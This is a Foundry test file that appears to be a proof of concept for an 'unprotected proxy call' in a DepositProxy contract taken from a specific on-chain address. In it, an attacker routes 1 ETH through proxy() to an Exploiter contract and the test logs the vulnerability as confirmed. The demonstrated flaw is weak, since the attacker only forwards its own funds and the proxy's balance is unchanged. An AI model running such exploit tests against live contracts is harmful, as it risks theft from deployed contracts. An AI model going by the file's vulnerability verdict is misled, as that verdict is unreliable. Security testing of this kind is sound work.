// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0xb11b2fed6c9354f7aa2f658d3b4d7b31d8a13b77.sol";

contract Exploiter {
    receive() external payable {}
}

contract UnprotectedProxyCallTest is Test {
    DepositProxy depositProxy;
    Exploiter exploiter;
    address owner = address(0x1);
    address attacker = address(0x2);
    uint256 initialBalance = 1 ether;

    function setUp() public {
        vm.deal(owner, initialBalance);
        vm.prank(owner);
        depositProxy = new DepositProxy{value: initialBalance}();

        // Fund attacker to show they can route arbitrary value through proxy
        vm.deal(attacker, initialBalance);
    }

    function test_AttackViaUnprotectedProxyCall() public {
        exploiter = new Exploiter();

        console.log("--- BEFORE-Trigger ProxyCall ---");
        uint256 proxyBalanceBefore = address(depositProxy).balance;
        uint256 exploiterBalanceBefore = address(exploiter).balance;
        console.log("DepositProxy balance (pre):   %s", proxyBalanceBefore);
        console.log("Exploiter balance (pre):      %s", exploiterBalanceBefore);
        
        console.log("--- Trigger Attack ---");
        // Attacker exploits unprotected proxy call to route 1 ETH
        vm.prank(attacker);
        depositProxy.proxy{value: initialBalance}(
            address(exploiter), 
            "" // Empty data triggers receive()
        );
        
        console.log("--- AFTER-Trigger ProxyCall ---");
        uint256 proxyBalanceAfter = address(depositProxy).balance;
        uint256 exploiterBalanceAfter = address(exploiter).balance;
        console.log("DepositProxy balance (post):  %s", proxyBalanceAfter);
        console.log("Exploiter balance (post):     %s", exploiterBalanceAfter);

        // The exploiter should now have the attacker's funds
        assertEq(exploiterBalanceAfter, initialBalance, "Exploiter didn't receive funds");
        
        // Differential validation
        if (exploiterBalanceAfter == initialBalance && proxyBalanceAfter == proxyBalanceBefore) {
            console.log("Vulnerability confirmed: Funds routed without affecting proxy balance");
            console.log("Vulnerability Exists: Unprotected proxy call allows attackers to route funds to arbitrary addresses");
        } else {
            console.log("Vulnerability not Exist: State changes do not match expected exploitation pattern");
        }
    }
}